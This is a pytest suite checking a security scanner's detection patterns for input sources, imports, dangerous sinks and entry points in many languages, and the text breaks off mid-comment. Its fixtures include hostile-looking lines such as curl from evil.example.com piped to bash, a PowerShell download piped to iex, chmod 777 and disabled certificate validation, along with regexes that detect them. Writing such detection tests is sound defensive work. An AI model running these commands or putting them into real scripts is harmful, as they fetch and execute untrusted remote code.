"""Streaming-scanner detection catalogue: sources, imports, extra sinks,
extra entry points.

Covers the four tables in `assess.lib.treesitter_index` that this suite
owns: `_STREAM_SOURCE_PATTERNS`, `_STREAM_IMPORT_PATTERNS`,
`_STREAM_EXTRA_SINK_PATTERNS` and `_STREAM_EXTRA_ENTRY_PATTERNS`. As of this
audit these hold 83 entries across 17 languages (up from the 60/15 in the
original assignment brief -- a `powershell` language landed mid-audit via a
concurrent edit to the very same tables, and `blade` plus php's framework
request accessors landed the same way after it; see the module note below). Every
pattern is classified LIVE / DEAD / REDUNDANT / OBSOLETE / MISROUTED by
executing the real indexer/scanner against idiomatic 2026 fixtures; only
LIVE patterns get a positive test (see the OBSOLETE allow-list on the
meta-test for the rest, with reasons).

Mechanics this suite leans on (verified against the source, not assumed):

* `_STREAM_SOURCE_PATTERNS` reaches EVERY file, on every path, through
  `_attach_bounded_security_sources` (treesitter_index.py:3874ish, called
  from both the lightweight and tree-sitter branches of `index_file`).
  Tested here through the real `index_file()` entry point, the genuine
  production route -- not a direct scanner call.
* `_STREAM_IMPORT_PATTERNS` / `_STREAM_EXTRA_SINK_PATTERNS` /
  `_STREAM_EXTRA_ENTRY_PATTERNS` fire only when the whole artifact is
  produced by `streaming_security_fallback` (directly, or via a degraded
  `index_file`). For the eight lightweight languages (blade, dockerfile,
  shell, powershell, lua, html, css, freemarker) the NORMAL route is
  `_index_lightweight`'s own hand-written extractor -- these three tables
  are reachable only through a genuine degradation, which a real 2026
  target hits via `parser_boundary.py`'s `giant_line_resource_limit` /
  `exact_parser_source_limit` (a >1MB single line -- a minified CSS/JS
  bundle, a base64-embedded installer payload -- or a >8MB file) or
  `invalid_utf8_source` gates (`parser_boundary.py:294-303`). One test
  below drives that real route end-to-end rather than only calling
  `streaming_security_fallback` directly, to prove the route is genuine
  and not merely theoretical.
* `powershell` is the one exception: `_STREAM_EXTRA_SINK_PATTERNS
  ["powershell"]` IS `_PS_SINK_PATTERNS` (treesitter_index.py:2343, the
  identical list object), which the lightweight `_extract_powershell`
  extractor also compiles directly as `_PS_COMPILED_SINKS`
  (treesitter_index.py:2384-2387) and applies on ITS OWN normal path
  (treesitter_index.py:2492-2499). So, uniquely among the languages in
  this table, powershell's 8 extra-sink patterns are LIVE on the NORMAL
  production route too, not only under degradation -- tested here via
  plain `index_file()`, not `streaming_security_fallback`. Powershell's
  import and extra-entry patterns are NOT shared this way (the lightweight
  extractor uses its own separately-defined `_PS_IMPORT_RE` /
  `_PS_DOT_SOURCE_RE` / `_PS_PARAM_BLOCK_RE`), so those two tables stay
  degradation-only like every other lightweight language.
* The streaming scanner's hash-comment rule (`_opens_a_comment`,
  treesitter_index.py:3751-3756) is an explicit allowlist
  (`_HASH_COMMENT_LANGUAGES = {dockerfile, php, python, ruby, shell}`) with
  a per-language code-prefix exemption (`_HASH_CODE_PREFIXES = {php: "#[",
  shell: "#!"}"`) -- so `#include` (c/cpp), `#{...}` (freemarker numeric
  interpolation), and anything in a language outside that allowlist is
  never treated as a comment on the streaming path at all.
* `_byte_pattern` (treesitter_index.py ~3648) compiles every one of these
  patterns with `re.IGNORECASE`, unconditionally, for every language.
"""
from __future__ import annotations

import json

import pytest

from assess.lib import treesitter_index
from assess.lib.parser_boundary import DEFAULT_MAX_LINE_BYTES
from assess.lib.parser_boundary import index_file as boundary_index_file
from assess.lib.treesitter_index import (
    STREAMING_SCAN_WINDOW_BYTES,
    index_file,
    streaming_security_fallback,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _line_of(needle: str, source: str) -> int:
    lines = source.splitlines()
    matches = [number for number, line in enumerate(lines, 1) if needle in line]
    assert len(matches) == 1, f"{needle!r} is not unique in fixture: {matches}"
    return matches[0]


def _stream(source: str, file_path: str, language: str) -> dict:
    data = source.encode("utf-8")
    chunks = (
        data[offset : offset + STREAMING_SCAN_WINDOW_BYTES]
        for offset in range(0, len(data), STREAMING_SCAN_WINDOW_BYTES)
    )
    return streaming_security_fallback(
        file_path, language, chunks, degradation_reason="forced_for_test"
    )


# ---------------------------------------------------------------------------
# Fixtures -- security_sources, tested through the real `index_file()` route
# (production: `_attach_bounded_security_sources` runs on every file).
# ---------------------------------------------------------------------------

PY_SOURCES_SRC = """\
def handler():
    uid = request.args.get('id')
    fmt = request.form['x']
    body = request.json
    v = request.values.get('v')
    f = request.files['f']
    h = request.headers.get('X')
    a = sys.argv[1]
    e = os.environ['HOME']
    g = getenv('X')
    n = input('name: ')
"""

JS_SOURCES_SRC = """\
function handler(req, res) {
  const id = req.params.id;
  const q = req.query.x;
  const b = req.body;
  const h = req.headers['x'];
  const c = req.cookies.session;
  const a = process.argv[2];
  const e = process.env.HOME;
}
"""

TS_SOURCES_SRC = JS_SOURCES_SRC

JAVA_SOURCES_SRC = """\
class App {
    void handle(HttpServletRequest req) {
        String p = req.getParameter("id");
        String h = req.getHeader("X");
        java.io.InputStream in = req.getInputStream();
        String env = System.getenv("HOME");
    }
}
"""

GO_SOURCES_SRC = """\
package main
import ("net/http"; "os")
func handle(w http.ResponseWriter, r *http.Request) {
    q := r.URL.Query()
    v := r.FormValue("x")
    h := r.Header.Get("X")
    a := os.Args[1]
    e := os.Getenv("HOME")
}
"""

RUBY_SOURCES_SRC = """\
class App
  def handle
    id = params[:id]
    x = request.body.read
    e = ENV['HOME']
    a = ARGV[0]
  end
end
"""

PHP_SOURCES_SRC = """\
<?php
function handle() {
    $id = $_GET['id'];
    $x = $_POST['x'];
    $y = $_REQUEST['y'];
    $c = $_COOKIE['s'];
    $f = $_FILES['f'];
    $s = $_SERVER['REMOTE_ADDR'];
    $e = getenv('HOME');
}

function handleFramework(Request $request) {
    $page = $request->input('page');
    $legacy = Input::get('legacy');
}
"""

BLADE_SOURCES_SRC = """\
<p>{{ $user->name }}</p>
<p>{!! $user->bio !!}</p>
"""

C_SOURCES_SRC = """\
#include <stdlib.h>
#include <unistd.h>
int main(int argc, char **argv) {
    char *a = argv[1];
    char *e = getenv("HOME");
    char buf[64];
    read(0, buf, 64);
    recv(0, buf, 64, 0);
    return 0;
}
"""

CPP_SOURCES_SRC = """\
#include <cstdlib>
int main(int argc, char **argv) {
    char *a = argv[1];
    char *e = getenv("HOME");
    return 0;
}
"""

CPP_HTTP_SOURCE_SRC = """\
void serve(const Request& req) {
    auto path = req.path;
}
"""

SHELL_SOURCES_SRC = "#!/bin/bash\necho $1\necho $HOME\necho ${path}\necho $USER_input\n"

DOCKERFILE_SOURCES_SRC = "FROM alpine\nARG BUILD_ID\nENV API_KEY=changeme\n"

LUA_SOURCES_SRC = "local id = ARGV[1]\nlocal k = KEYS[1]\n"

HTML_SOURCES_SRC = "<p>{{ user.name }}</p>\n<p><% value %></p>\n"

CSS_SOURCES_SRC = "/* {{theme}} */\nbody { color: <% c %>; }\n"

FREEMARKER_SOURCES_SRC = "<p>${user.name}</p>\n<p>#{count}</p>\n"

PS_SOURCES_SRC = """\
function Get-UserData {
    param($id)
    $name = $args[0]
    $bound = $PSBoundParameters
    $inv = $MyInvocation
    $key = $env:API_KEY
    $answer = Read-Host "Enter value"
}
"""

CSHARP_SOURCES_SRC = """\
using Microsoft.AspNetCore.Mvc;
using System;

public class HomeController : Controller
{
    public IActionResult Index()
    {
        var id = Request.QueryString["id"];
        var home = Environment.GetEnvironmentVariable("HOME");
        return View();
    }

    public IActionResult Save([FromBody] string body)
    {
        return Ok();
    }
}
"""

# ---------------------------------------------------------------------------
# Fixtures -- imports / extra sinks / extra entry points, one line per
# pattern, tested via `streaming_security_fallback` directly (matching the
# freemarker suite's `test_streaming_fallback_retains_freemarker_signal`
# idiom) -- these three tables never see a real byte outside degradation.
# ---------------------------------------------------------------------------

PY_IMPORT_SRC = "from foo.bar import baz\nimport os\n"
JS_IMPORT_SRC = "import foo from 'foo';\nconst bar = require('bar');\n"
TS_IMPORT_SRC = JS_IMPORT_SRC
JAVA_IMPORT_SRC = "import java.util.List;\n"
GO_IMPORT_SRC = 'import (\n\t"fmt"\n)\n'
RUBY_IMPORT_SRC = "require 'json'\nrequire_relative './lib'\nload 'config.rb'\n"
PHP_IMPORT_SRC = (
    "<?php\ninclude 'a.php';\ninclude_once 'b.php';\n"
    "require 'c.php';\nrequire_once 'd.php';\nuse App\\Foo;\n"
)
CSHARP_IMPORT_SRC = "using System.Data;\nusing System.Text;\nusing static System.Math;\n"
C_IMPORT_SRC = '#include <stdio.h>\n#include "local.h"\n'
CPP_IMPORT_SRC = '#include <iostream>\n#include "local.hpp"\n'
LUA_IMPORT_SRC = "local m = require('module')\n"
DOCKERFILE_IMPORT_SRC = "FROM alpine\nADD file.tar.gz /app\n"
SHELL_IMPORT_SRC = "#!/bin/bash\n. ./lib.sh\nsource ./other.sh\n"
HTML_IMPORT_SRC = (
    '<script src="app.js"></script>\n<link href="style.css">\n'
    '<iframe src="frame.html"></iframe>\n'
)
CSS_IMPORT_SRC = "@import url('base.css');\n"
FREEMARKER_IMPORT_SRC = (
    '<#include "common.ftl">\n<#import "layout.ftl" as l>\n<script src="a.js"></script>\n'
)
PS_IMPORT_SRC = "Import-Module PSReadLine\n. .\\lib\\helpers.psm1\n"
BLADE_IMPORT_SRC = (
    "@extends('layouts.app')\n@include('partials.header')\n"
    '<script src="app.js"></script>\n'
)

DOCKERFILE_SINK_SRC = (
    "FROM alpine\nRUN curl https://evil.example.com/x.sh | bash\nRUN chmod -R 0777 /app\n"
)
SHELL_SINK_SRC = '#!/bin/bash\neval "$cmd"\ncurl https://x.example.com/i.sh | sh\n'
LUA_SINK_SRC = "loadstring(usercode)()\nos.execute(cmd)\nreturn redis.call(ARGV[1], KEYS[1])\n"
HTML_SINK_SRC = '<button onclick="doThing()">Go</button>\n<p>{{ raw_html }}</p>\n'
FREEMARKER_SINK_SRC = (
    '<p>${value}</p>\n<button onclick="go(\'${x}\')">Go</button>\n<p>${data?eval}</p>\n'
)
# powershell sinks are tested through `index_file` on the normal lightweight
# route (see module docstring) -- not through `_stream`.
PS_SINK_SRC = """\
function Do-Things {
    Invoke-Expression $cmd
    Start-Process notepad.exe
    Invoke-WebRequest -Uri $url | iex
    Import-Clixml -Path $file
    Get-Content -Path $file
    ConvertTo-SecureString "hunter2" -AsPlainText -Force
    [x]::ServerCertificateValidationCallback = {$true}
}
"""

BLADE_SINK_SRC = (
    "<p>{{ $name }}</p>\n<p>{!! $bio !!}</p>\n"
    '<button onclick="go()">Go</button>\n'
)
BLADE_ENTRY_SRC = '<form action="/tags/save" method="post"></form>\n'

SHELL_ENTRY_SRC = "#!/bin/bash\necho hi\n"
DOCKERFILE_ENTRY_SRC = 'FROM alpine\nCMD ["run"]\nENTRYPOINT ["/bin/app"]\n'
HTML_ENTRY_SRC = '<form action="/submit" method="post"></form>\n'
FREEMARKER_ENTRY_SRC = (
    '<form action="/submit"></form>\n<#macro alert kind>x</#macro>\n'
    "<#function upper v>x</#function>\n"
)
PS_ENTRY_SRC = "param(\n  [string]$Name\n)\n"


# ---------------------------------------------------------------------------
# Catalogue sweep. `route` selects how the case is executed and which result
# list/field is checked:
#   "source"      -> index_file(); check security_sources[line]==kind
#   "ps_sink"     -> index_file(); check security_sinks[line]==kind (the one
#                    powershell dual-path exception, see module docstring)
#   "import"      -> streaming_security_fallback(); needle text must appear
#                    among import_targets at the expected line
#   "extra_sink"  -> streaming_security_fallback(); check security_sinks
#   "extra_entry" -> streaming_security_fallback(); check entry_points
# Fields: (table, language, pattern, route, source, file_path, needle, kind)
LIVE_CASES: list[tuple[str, str, str, str, str, str, str, str]] = [
    # ============================= sources ================================
    ("source", "python", r"\brequest\.(?:args|form|json|values|files|headers|GET|POST|FILES|COOKIES|META|body)\b", "source", PY_SOURCES_SRC, "app.py", "uid = request.args.get('id')", "http_request_input"),
    ("source", "python", r"\b(?:sys\.argv|os\.environ|getenv\s*\(|input\s*\()", "source", PY_SOURCES_SRC, "app.py", "a = sys.argv[1]", "process_input"),
    ("source", "javascript", r"\breq\.(?:params|query|body|headers|cookies)\b", "source", JS_SOURCES_SRC, "server.js", "const id = req.params.id;", "http_request_input"),
    ("source", "javascript", r"\bprocess\.(?:argv|env)\b", "source", JS_SOURCES_SRC, "server.js", "const a = process.argv[2];", "process_input"),
    ("source", "typescript", r"\breq\.(?:params|query|body|headers|cookies)\b", "source", TS_SOURCES_SRC, "server.ts", "const id = req.params.id;", "http_request_input"),
    ("source", "typescript", r"\bprocess\.(?:argv|env)\b", "source", TS_SOURCES_SRC, "server.ts", "const a = process.argv[2];", "process_input"),
    ("source", "java", r"\bget(?:Parameter|Header|InputStream)\s*\(", "source", JAVA_SOURCES_SRC, "App.java", 'String p = req.getParameter("id");', "http_request_input"),
    ("source", "java", r"@(?:PathVariable|MatrixVariable|RequestParam|RequestHeader|CookieValue|RequestBody|RequestPart|ModelAttribute|PathParam|QueryParam|FormParam|HeaderParam|CookieParam|MatrixParam)\b", "source",
     'class Files { @GetMapping("/files") String read(@RequestParam String name) { return name; } }',
     "Files.java", "@RequestParam String name", "http_request_input"),
    ("source", "java", r"\brequest\.(?:pathVariable|queryParam|param|headers|body)\s*\(", "source",
     'class Routes { Object route() { return request.pathVariable("name"); } }',
     "Routes.java", 'request.pathVariable("name")', "http_request_input"),
    ("source", "java", r"\bSystem\.getenv\s*\(", "source", JAVA_SOURCES_SRC, "App.java", 'String env = System.getenv("HOME");', "process_input"),
    ("source", "go", r"\b(?:r|req|request)\.(?:URL\.Query|FormValue|PostFormValue|PathValue|Header\.Get|Cookie|FormFile)\s*\(", "source", GO_SOURCES_SRC, "main.go", 'q := r.URL.Query()', "http_request_input"),
    ("source", "go", r"\bos\.(?:Args|Getenv)\b", "source", GO_SOURCES_SRC, "main.go", "a := os.Args[1]", "process_input"),
    ("source", "ruby", r"\b(?:params\s*\[|request\.)", "source", RUBY_SOURCES_SRC, "app.rb", "id = params[:id]", "http_request_input"),
    ("source", "ruby", r"\b(?:ENV\s*\[|ARGV\b)", "source", RUBY_SOURCES_SRC, "app.rb", "e = ENV['HOME']", "process_input"),
    ("source", "php", r"\$_(?:GET|POST|REQUEST|COOKIE|FILES|SERVER)\b", "source", PHP_SOURCES_SRC, "index.php", "$id = $_GET['id'];", "http_request_input"),
    ("source", "php", r"(?:\$request|\$req|\$this->(?:request|input)|\brequest\s*\(\s*\))\s*->", "source", PHP_SOURCES_SRC, "index.php", "$page = $request->input('page');", "http_request_input"),
    ("source", "php", r"\b(?:Input|Request)::(?:input|get|all|query|post|json|file|header|cookie)\s*\(", "source", PHP_SOURCES_SRC, "index.php", "$legacy = Input::get('legacy');", "http_request_input"),
    ("source", "php", r"\bgetenv\s*\(", "source", PHP_SOURCES_SRC, "index.php", "$e = getenv('HOME');", "process_input"),
    ("source", "blade", r"\{\{(?!--)[^}\r\n]+\}\}|\{!![^!\r\n]+!!\}", "source", BLADE_SOURCES_SRC, "profile.blade.php", "{{ $user->name }}", "template_input"),
    ("source", "c", r"\b(?:argv\s*\[|getenv\s*\(|read\s*\(|recv\s*\()", "source", C_SOURCES_SRC, "main.c", 'char *a = argv[1];', "process_input"),
    ("source", "cpp", r"\b(?:argv\s*\[|getenv\s*\(|read\s*\(|recv\s*\()", "source", CPP_SOURCES_SRC, "main.cpp", 'char *a = argv[1];', "process_input"),
    ("source", "cpp", r"\b(?:req|request)\.(?:path|body|get_param_value\s*\(|get_header_value\s*\()", "source", CPP_HTTP_SOURCE_SRC, "server.cpp", "req.path", "http_request_input"),
    ("source", "shell", r"\$(?:[1-9]\b|[@*]|\{(?:[1-9][0-9]*|[@*])\})", "source", SHELL_SOURCES_SRC, "install.sh", "echo $1", "positional_parameter"),
    ("source", "shell", r"\$\{?[A-Z_][A-Z0-9_]*\}?", "source", SHELL_SOURCES_SRC, "install.sh", "echo $HOME", "environment_input"),
    ("source", "dockerfile", r"^\s*(?:ARG|ENV)\s+[A-Za-z_][A-Za-z0-9_]*", "source", DOCKERFILE_SOURCES_SRC, "Dockerfile", "ARG BUILD_ID", "build_argument"),
    ("source", "lua", r"\b(?:ARGV|KEYS)\s*\[", "source", LUA_SOURCES_SRC, "script.lua", "local id = ARGV[1]", "script_argument"),
    ("source", "html", r"\{\{[^}\r\n]+\}\}|<%[^%\r\n]+%>", "source", HTML_SOURCES_SRC, "index.html", "{{ user.name }}", "template_input"),
    ("source", "css", r"\{\{[^}\r\n]+\}\}|<%[^%\r\n]+%>", "source", CSS_SOURCES_SRC, "style.css", "{{theme}}", "template_input"),
    ("source", "freemarker", r"[$#]\{[^}\r\n]+\}", "source", FREEMARKER_SOURCES_SRC, "page.ftl", "${user.name}", "template_input"),
    ("source", "powershell", r"\$(?:args|PSBoundParameters|MyInvocation)\b", "source", PS_SOURCES_SRC, "script.ps1", "$name = $args[0]", "script_parameter"),
    ("source", "powershell", r"\$env:[A-Za-z_]\w*", "source", PS_SOURCES_SRC, "script.ps1", "$key = $env:API_KEY", "environment_input"),
    ("source", "powershell", r"\bRead-Host\b", "source", PS_SOURCES_SRC, "script.ps1", "$answer = Read-Host", "interactive_input"),
    ("source", "csharp", r"\b(?:HttpContext\.)?Request\.(?:Form|QueryString|Query|Params|Headers|Cookies|Body)\b", "source", CSHARP_SOURCES_SRC, "HomeController.cs", 'var id = Request.QueryString["id"];', "http_request_input"),
    ("source", "csharp", r"\[From(?:Body|Query|Route|Form|Header)\b", "source", CSHARP_SOURCES_SRC, "HomeController.cs", "public IActionResult Save([FromBody] string body)", "http_request_input"),
    ("source", "csharp", r"\b(?:Environment\.GetEnvironmentVariable\s*\(|Console\.ReadLine\s*\()", "source", CSHARP_SOURCES_SRC, "HomeController.cs", 'var home = Environment.GetEnvironmentVariable("HOME");', "process_input"),
    # ============================= imports =================================
    ("import", "python", r"\b(?:from\s+[\w.]+\s+import\b[^\r\n]*|import\s+[^\r\n]+)", "import", PY_IMPORT_SRC, "x.py", "import os", None),
    ("import", "javascript", r"\bimport\b[^\r\n]*", "import", JS_IMPORT_SRC, "x.js", "import foo from 'foo';", None),
    ("import", "javascript", r"\brequire\s*\([^\r\n]*", "import", JS_IMPORT_SRC, "x.js", "const bar = require('bar');", None),
    ("import", "typescript", r"\bimport\b[^\r\n]*", "import", TS_IMPORT_SRC, "x.ts", "import foo from 'foo';", None),
    ("import", "typescript", r"\brequire\s*\([^\r\n]*", "import", TS_IMPORT_SRC, "x.ts", "const bar = require('bar');", None),
    ("import", "java", r"\bimport\s+[\w.*]+", "import", JAVA_IMPORT_SRC, "x.java", "import java.util.List;", None),
    ("import", "go", r"\bimport\s*(?:\([^\r\n]*|[\"`][^\"`]+[\"`])", "import", GO_IMPORT_SRC, "x.go", "import (", None),
    ("import", "ruby", r"\b(?:require|require_relative|load)\s*\(?\s*['\"][^'\"]+", "import", RUBY_IMPORT_SRC, "x.rb", "require 'json'", None),
    ("import", "php", r"\b(?:include|include_once|require|require_once|use)\b[^\r\n;]*", "import", PHP_IMPORT_SRC, "x.php", "include 'a.php';", None),
    ("import", "csharp", r"\busing\s+(?:static\s+)?[^\r\n;=]+", "import", CSHARP_IMPORT_SRC, "Repo.cs", "using System.Data", None),
    ("import", "c", r"#\s*include\s*[<\"][^>\"]+[>\"]", "import", C_IMPORT_SRC, "x.c", "#include <stdio.h>", None),
    ("import", "cpp", r"#\s*include\s*[<\"][^>\"]+[>\"]", "import", CPP_IMPORT_SRC, "x.cpp", "#include <iostream>", None),
    ("import", "lua", r"\brequire\s*\(?\s*['\"][^'\"]+", "import", LUA_IMPORT_SRC, "x.lua", "local m = require('module')", None),
    ("import", "dockerfile", r"^\s*(?:FROM|ADD)\s+[^\r\n]+", "import", DOCKERFILE_IMPORT_SRC, "Dockerfile", "ADD file.tar.gz /app", None),
    ("import", "shell", r"^\s*(?:\.|source)\s+[^\r\n]+", "import", SHELL_IMPORT_SRC, "x.sh", "source ./other.sh", None),
    ("import", "html", r"<(?:script|link|iframe)\b[^>]*(?:src|href)\s*=\s*['\"]?[^'\"\s>]+", "import", HTML_IMPORT_SRC, "x.html", "<link href=", None),
    ("import", "css", r"@import\s+(?:url\()?\s*['\"]?[^'\"\s)]+", "import", CSS_IMPORT_SRC, "x.css", "@import url('base.css');", None),
    ("import", "freemarker", r"<#(?:include|import)\s[^\r\n>]*", "import", FREEMARKER_IMPORT_SRC, "x.ftl", '<#include "common.ftl">', None),
    ("import", "freemarker", r"<(?:script|link|iframe)\b[^>]*(?:src|href)\s*=\s*['\"]?[^'\"\s>]+", "import", FREEMARKER_IMPORT_SRC, "x.ftl", '<script src="a.js">', None),
    ("import", "powershell", r"^\s*(?:Import-Module|using\s+(?:module|namespace))\s+[^\r\n]+", "import", PS_IMPORT_SRC, "mod.ps1", "Import-Module PSReadLine", None),
    ("import", "powershell", r"^\s*\.\s+[^\s\r\n]+\.psm?1", "import", PS_IMPORT_SRC, "mod.ps1", "helpers.psm1", None),
    ("import", "blade", r"@(?:extends|include(?:First|Unless|When|If)?|component|each)\s*\([^\r\n)]*", "import", BLADE_IMPORT_SRC, "x.blade.php", "@extends('layouts.app')", None),
    ("import", "blade", r"<(?:script|link|iframe)\b[^>]*(?:src|href)\s*=\s*['\"]?[^'\"\s>]+", "import", BLADE_IMPORT_SRC, "x.blade.php", '<script src="app.js">', None),
    # ========================== extra sinks =================================
    ("extra_sink", "dockerfile", r"\b(?:curl|wget)\b[^\r\n|;]*\|\s*(?:sh|bash|zsh)\b", "extra_sink", DOCKERFILE_SINK_SRC, "Dockerfile", "RUN curl https://evil.example.com/x.sh | bash", "remote_pipe_to_shell"),
    ("extra_sink", "dockerfile", r"\bchmod\s+(?:-R\s+)?[0-7]*777\b", "extra_sink", DOCKERFILE_SINK_SRC, "Dockerfile", "RUN chmod -R 0777 /app", "permissive_chmod"),
    ("extra_sink", "shell", r"\beval\b", "extra_sink", SHELL_SINK_SRC, "x.sh", 'eval "$cmd"', "shell_eval"),
    ("extra_sink", "shell", r"\b(?:curl|wget)\b[^\r\n|;]*\|\s*(?:sh|bash|zsh)\b", "extra_sink", SHELL_SINK_SRC, "x.sh", "curl https://x.example.com/i.sh | sh", "remote_pipe_to_shell"),
    ("extra_sink", "lua", treesitter_index._LUA_DYNAMIC_REDIS_COMMAND_RE, "extra_sink", LUA_SINK_SRC, "x.lua", "redis.call(ARGV[1], KEYS[1])", "redis_dynamic_command"),
    ("extra_sink", "lua", r"\b(?:loadstring|load)\s*\(", "extra_sink", LUA_SINK_SRC, "x.lua", "loadstring(usercode)()", "dynamic_code_load"),
    ("extra_sink", "lua", r"\bos\.execute\s*\(", "extra_sink", LUA_SINK_SRC, "x.lua", "os.execute(cmd)", "os_execute"),
    ("extra_sink", "html", r"\bon[a-z]+\s*=\s*['\"][^'\"]+['\"]", "extra_sink", HTML_SINK_SRC, "x.html", 'onclick="doThing()"', "inline_event_handler"),
    ("extra_sink", "html", r"\{\{[^}\r\n]+\}\}", "extra_sink", HTML_SINK_SRC, "x.html", "{{ raw_html }}", "template_interpolation"),
    # css_expression / css_behavior: OBSOLETE, excluded -- see meta-test
    ("extra_sink", "freemarker", r"[$#]\{[^}\r\n]+\}", "extra_sink", FREEMARKER_SINK_SRC, "x.ftl", "<p>${value}</p>", "template_interpolation"),
    ("extra_sink", "freemarker", r"\bon[a-z]+\s*=\s*['\"][^'\"]+['\"]", "extra_sink", FREEMARKER_SINK_SRC, "x.ftl", "onclick=", "inline_event_handler"),
    ("extra_sink", "freemarker", r"\?(?:eval|eval_json|evalJson|interpret|new)\b", "extra_sink", FREEMARKER_SINK_SRC, "x.ftl", "${data?eval}", "freemarker_dynamic_evaluation"),
    ("extra_sink", "blade", r"\{!![^!\r\n]+!!\}", "extra_sink", BLADE_SINK_SRC, "x.blade.php", "{!! $bio !!}", "unescaped_output"),
    ("extra_sink", "blade", r"\{\{(?!--)[^}\r\n]+\}\}", "extra_sink", BLADE_SINK_SRC, "x.blade.php", "{{ $name }}", "template_interpolation"),
    ("extra_sink", "blade", r"\bon[a-z]+\s*=\s*['\"][^'\"]+['\"]", "extra_sink", BLADE_SINK_SRC, "x.blade.php", 'onclick="go()"', "inline_event_handler"),
    # powershell's 8 -- dual-path, tested via plain index_file (route="ps_sink")
    ("extra_sink", "powershell", r"\b(?:Invoke-Expression|iex)\b|\[scriptblock\]::Create\s*\(|\bAdd-Type\b", "ps_sink", PS_SINK_SRC, "sinks.ps1", "Invoke-Expression $cmd", "dynamic_code_evaluation"),
    ("extra_sink", "powershell", r"\b(?:Start-Process|Invoke-Item|Invoke-Command|Start-Job)\b", "ps_sink", PS_SINK_SRC, "sinks.ps1", "Start-Process notepad.exe", "process_exec"),
    # This line also fires dynamic_code_evaluation (the trailing `| iex`) and
    # remote_download_to_execution (the whole Invoke-WebRequest...|iex
    # shape) -- all three are independently real, non-overlapping catalogue
    # entries and each gets its own row here.
    ("extra_sink", "powershell", r"\b(?:Invoke-WebRequest|Invoke-RestMethod|iwr|irm)\b|\bNet\.WebClient\b", "ps_sink", PS_SINK_SRC, "sinks.ps1", "Invoke-WebRequest -Uri $url | iex", "url_fetch"),
    ("extra_sink", "powershell", r"\b(?:DownloadString|DownloadFile|Invoke-WebRequest|Invoke-RestMethod|iwr|irm)\b[^|\r\n]*\|\s*(?:iex|Invoke-Expression)\b", "ps_sink", PS_SINK_SRC, "sinks.ps1", "Invoke-WebRequest -Uri $url | iex", "remote_download_to_execution"),
    ("extra_sink", "powershell", r"\bImport-Clixml\b|\[System\.Management\.Automation\.PSSerializer\]::Deserialize", "ps_sink", PS_SINK_SRC, "sinks.ps1", "Import-Clixml -Path $file", "deserialization"),
    ("extra_sink", "powershell", r"\b(?:Get-Content|Set-Content|Add-Content|Out-File|Remove-Item|Join-Path)\b", "ps_sink", PS_SINK_SRC, "sinks.ps1", "Get-Content -Path $file", "file_path"),
    ("extra_sink", "powershell", r"\bConvertTo-SecureString\b[^\r\n]*-AsPlainText", "ps_sink", PS_SINK_SRC, "sinks.ps1", "ConvertTo-SecureString", "plaintext_secret"),
    ("extra_sink", "powershell", r"\bServerCertificateValidationCallback\b|-SkipCertificateCheck\b", "ps_sink", PS_SINK_SRC, "sinks.ps1", "ServerCertificateValidationCallback", "certificate_validation_disabled"),
    # ========================= extra entry points ============================
    ("extra_entry", "shell", r"^#!", "extra_entry", SHELL_ENTRY_SRC, "x.sh", "#!/bin/bash", "shell_script"),
    ("extra_entry", "dockerfile", r"^\s*CMD\b", "extra_entry", DOCKERFILE_ENTRY_SRC, "Dockerfile", 'CMD ["run"]', "container_cmd"),
    ("extra_entry", "dockerfile", r"^\s*ENTRYPOINT\b", "extra_entry", DOCKERFILE_ENTRY_SRC, "Dockerfile", 'ENTRYPOINT ["/bin/app"]', "container_entrypoint"),
    ("extra_entry", "html", r"<form\b", "extra_entry", HTML_ENTRY_SRC, "x.html", '<form action="/submit"', "html_form"),
    ("extra_entry", "freemarker", r"<form\b", "extra_entry", FREEMARKER_ENTRY_SRC, "x.ftl", '<form action="/submit">', "html_form"),
    ("extra_entry", "freemarker", r"<#(?:macro|function)\s", "extra_entry", FREEMARKER_ENTRY_SRC, "x.ftl", "<#macro alert kind>", "freemarker_macro"),
    ("extra_entry", "powershell", r"^\s*param\s*\(", "extra_entry", PS_ENTRY_SRC, "mod2.ps1", "param(", "script_parameters"),
    ("extra_entry", "blade", r"<form\b", "extra_entry", BLADE_ENTRY_SRC, "x.blade.php", '<form action="/tags/save"', "html_form"),
]


@pytest.mark.parametrize(
    ("table", "language", "pattern", "route", "source", "file_path", "needle", "kind"),
    LIVE_CASES,
    ids=[f"{c[0]}:{c[1]}:{c[2][:40]}" for c in LIVE_CASES],
)
def test_live_streaming_pattern_fires_on_idiomatic_code(
    table: str,
    language: str,
    pattern: str,
    route: str,
    source: str,
    file_path: str,
    needle: str,
    kind: str | None,
) -> None:
    line = _line_of(needle, source)

    if route == "source":
        result = index_file(file_path, language, source=source.encode("utf-8"))
        records = result["security_sources"]
        matches = [r for r in records if r["line"] == line and r["kind"] == kind]
        assert matches, (
            f"expected security_sources kind={kind!r} at line {line} "
            f"(table={table}, language={language}, pattern={pattern!r}); "
            f"got {json.dumps(records)}"
        )
    elif route == "ps_sink":
        result = index_file(file_path, language, source=source.encode("utf-8"))
        assert result["analysis_mode"] == "lightweight_regex"
        records = result["security_sinks"]
        matches = [r for r in records if r["line"] == line and r["kind"] == kind]
        assert matches, (
            f"expected security_sinks kind={kind!r} at line {line} on the "
            f"normal powershell route (table={table}, pattern={pattern!r}); "
            f"got {json.dumps(records)}"
        )
    elif route == "import":
        result = _stream(source, file_path, language)
        matches = [t for t in result["import_targets"] if t["line"] == line and needle in t["raw"]]
        assert matches, (
            f"expected an import at line {line} containing {needle!r} "
            f"(table={table}, language={language}, pattern={pattern!r}); "
            f"got {json.dumps(result['import_targets'])}"
        )
    elif route == "extra_sink":
        result = _stream(source, file_path, language)
        records = result["security_sinks"]
        matches = [r for r in records if r["line"] == line and r["kind"] == kind]
        assert matches, (
            f"expected streaming security_sinks kind={kind!r} at line {line} "
            f"(table={table}, language={language}, pattern={pattern!r}); "
            f"got {json.dumps(records)}"
        )
    elif route == "extra_entry":
        result = _stream(source, file_path, language)
        records = result["entry_points"]
        matches = [r for r in records if r["line"] == line and r["kind"] == kind]
        assert matches, (
            f"expected streaming entry_points kind={kind!r} at line {line} "
            f"(table={table}, language={language}, pattern={pattern!r}); "
            f"got {json.dumps(records)}"
        )
    else:  # pragma: no cover - guards against a typo in the case table
        raise AssertionError(f"unknown route {route!r}")


# ---------------------------------------------------------------------------
# The genuine production route into the streaming-only tables: a real
# `giant_line_resource_limit` degradation through `parser_boundary.index_file`
# (not `streaming_security_fallback` called directly), proving this is a real
# 2026 code path and not merely a theoretical one. A minified single-line CSS
